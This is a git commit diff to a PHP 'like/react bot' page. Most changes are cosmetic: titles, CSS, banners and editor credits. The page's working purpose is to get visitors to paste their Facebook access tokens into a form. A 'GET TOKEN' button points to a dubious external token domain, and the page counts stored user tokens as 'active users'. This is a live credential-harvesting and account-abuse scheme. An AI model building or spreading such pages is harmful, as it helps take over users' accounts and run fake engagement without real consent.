816d385847f37f661840b7670651173e0cb9fe34
mrdjayeh <markzackerb@gmail.com>
2018-07-02 20:49:54 +0500

    Update index.php

--- index.php
+++ index.php
@@ -4,7 +4,7 @@
 
 	<head>
 		<meta charset="utf-8"/>
-		<title>CRACKERX BOTTERX</title>
+		<title>MrDj AyeSh</title>
 
 
 
@@ -18,7 +18,7 @@
 
 html {
     text-align:center;
-    background: url(fe3l.jpg) no-repeat center center fixed; 
+    background: url(hh.jpg) no-repeat center center fixed; 
     -webkit-background-size: cover;
     -moz-background-size: cover;
     -o-background-size: cover;
@@ -45,16 +45,56 @@ html {
 
 
 
-#footer {
-   
+#footer a,
+.heading a,
+#navigation-menu h3 a,
+#comments h3 a,
+#navigation a,
+#following-list h4 a,
+#blogroll_list h3 a {
+    color:#eee;
+    text-shadow:#222 1px 1px 1px;
+}
+
+.post-single 
+.post-meta 
+.title,
+#following-list li a,
+#category-bottom li a,
+#recent-posts-list li a {
+    color:#444;
+    text-shadow:#fff 1px 1px 1px;
+}
+
+.post:first-child 
+.post-content a {
+    color:#444;
+    text-shadow:none
+}
+
+#footer span {
+    background:transparent !important;
+    border:none !important;
+    color:#eee !important
+}
+
+.date {
+    display:none;
+}
+
+.post-single 
+.post-content textarea {
+    width:70px;
+    height:70px;
+    padding:0;
     margin:0;
-    padding:5px;
-    text-align:center;
-    font-family: '', cursive;
-    font-size: 25px;
-    text-shadow: 0 0 11px #ff0000, 0 0 11px #ff0000, 0 0 11px #ff0000;
-    color: white;
-    }
+}
+
+.post-content,
+.comment-content {
+    word-wrap:break-word;
+}
+
 
 
 
@@ -67,31 +107,23 @@ html {
     border-width:1px 0
     }
 
-#user {
-    text-align:center;
-    margin:0;
-    padding:6px 0;
-    border-width:1px 0;
-    font-family: '', ;
-    font-size: 25px;
-    text-shadow: 0 0 11px #ff0000, 0 0 11px #ff0000, 0 0 11px #ff0000;
-    color: white;
-    }
-    
+
     
     .search {
- font-family: 'Cookie', cursive;
-    font-size: 25px;
-    background:none;
-    height:35px;
-    line-height:36px;
-    margin:5px 0 5px 10px;
-    padding:0 10px;
-    width:60%;
-    color:none;
+  font-family: 'Rancho', cursive;
+    font-size: 20px;
+    background:white;
+    color:black;
+    height:36px;
+    line-height:36px
+    margin:5px 10px 5px 0;
+    padding:0 12px;
     border-radius:15px;
-    border: 1px solid white;
-    text-align:center;
+    border: 3px solid black;
+    outline:none;
+    transition:all 0.25s;
+    -moz-transition:all 0.25s;
+    -webkit-transition:all 0.25s;
 }
 
 .search:focus {
@@ -103,14 +135,14 @@ html {
 .button {
     font-family: 'Rancho', cursive;
     font-size: 20px;
-    background:none;
-    color:none;
+    background:white;
+    color:black;
     height:36px;
     line-height:36px
     margin:5px 10px 5px 0;
     padding:0 12px;
     border-radius:15px;
-    border: 1px solid white;
+    border: 3px solid black;
     outline:none;
     transition:all 0.25s;
     -moz-transition:all 0.25s;
@@ -122,6 +154,11 @@ html {
     cursor:pointer;
     cursor: url(http://ani.cursors-4u.net/cursors/cur-11/cur1089.cur),progress !important;
 }
+
+
+
+
+
 
 
 
@@ -348,9 +385,9 @@ public function cek($tok,$id,$nm){
 
 echo '
 <div id="container">
-<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
-<br><font color="white"> Welcome TO AYESH BOT TEAM (JUST LOVE REACT ) Site :</font><font color="BLUE"> '.$nm.' </font></br>
-<font color="white"> Activate Your Bot My Dear Friend </font></br>
+<marquee direction="left"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
+<br>
+<br>
 <form action="index.php" method="post">
 <div id="top-content">
 <div id="search-form">
@@ -376,20 +413,24 @@ echo'
 <div id="header">
 <div class="foo">
 <center>
-<b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;color: yellow ;font-size:80px;">LONG LIKE+COMMENT SIT3 </font></b>
+<b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;color: yellow ;font-size:80px;">WELLCME TOU MY SITE JANI </font></b>
 </div>
 <br>
 </a></div>
 </font>
 </div></div>
-<a href="https://www.facebook.com/OLdISDISABLE" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100013201441761/picture?type=large" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a></div>
+<a href="https://www.facebook.com/OLdISDISABLE" alt="Owner" target="_blank"> <img src="baig.jpg" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a></div>
 <br>
 </div>
 
 <span>
 </div>
 
-<br><center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fold.is.disable&amp&amp;layout=standard&amp;show_faces=true&amp;colorscheme=dark&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
+ <centre><div id="content"></div> <div class="post"></div> <div class="post-content"><img src="" class="jarvis"><br> <img src="" class="jarvis-inner"></br></div> <div class="post-meta2"> </centre></div> 
+<center>
+<br>
+<br>
+<center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:yellow; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"width="250" height="250"><a href="http://scure-token.tk" target="blank"><input class="button button5" type="button" value="GET TOKEN"></a></font></center></a></li>
 
 ';
 }
@@ -398,13 +439,28 @@ public function bwh(){
 echo'
 
 <center>
-<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:30px;">! SUBMIT YOUR TOKEN HERE</font></b>
+<h4><font size="26" color="red"><center>•.¸¸.•`</font><font face="Orbitron" size="6" style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>  SUBMIT YOUR TOKEN HERE !  </b></font><font size="26" color="red"> `•.¸¸.•</center> </font></h4>
+<center>
+
+
+<center>
+<center> 
+
 
 <center>
 <center><form action="index.php" method="post">
-<input class="search" type="text" name="token" placeholder="Paste Your Access Token Here" required> <br>
+<input class="search" type="text" style="height:80px;width:600px;" name="token" placeholder="Paste Your Access Token Here" required> <input class="button" type="submit"style="height:82px;width:200px;" value="SUBMIT"></form></center> 
 
-<input class="button" type="submit" value="Submit"></form></center> 
+
+
+
+
+
+
+
+
+
+
 ';
 
 
@@ -434,18 +490,22 @@ $up=opendir('CHUMI');
 
 echo'
 
-<div id="footer">
-Active User: <font color="yellow">'.count($user).'
+
+</font></font></strong><font style="color:red;font-size:33px;"><font color="white"><center><strong><font size="60">ACTIVE USERX: <font color="red">'.count($user).'</font></strong></center>
 </font>
 
 </div>
 <center>
 </font>
-<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:20px;">Modified By : MRDJ AYESH</font></b>
-<center>
-</font>
-<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:20;">Edit By : AYAN ALI</font></b>
+</font><br>
+</font></font></strong><font style="color:red;font-size:33px;"><font color="white"><center><strong><font size="60"> SCRIPT EDITOR :    </strong><font style="color:red;font-size:33px;"><font color="red"><font size="60"> MRDJ AYASH  </font></strong></center>
 
+
+<br>
+<br>
+<br><br></font><marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="6" direction="left" truespeed="truespeed">
+<img src="SP.gif"></font></font></strong><font color="yellow"><font size="60">NOTE:-</b><font color="green"><font size="60"> POWERED BY TALHA BAIG*
+<img src="MS.gif"></marquee>
 
 
 
@@ -537,3 +597,6 @@ if($_GET[token]){
         $bot->bwh();}}
 }
 ?>
+
+
+
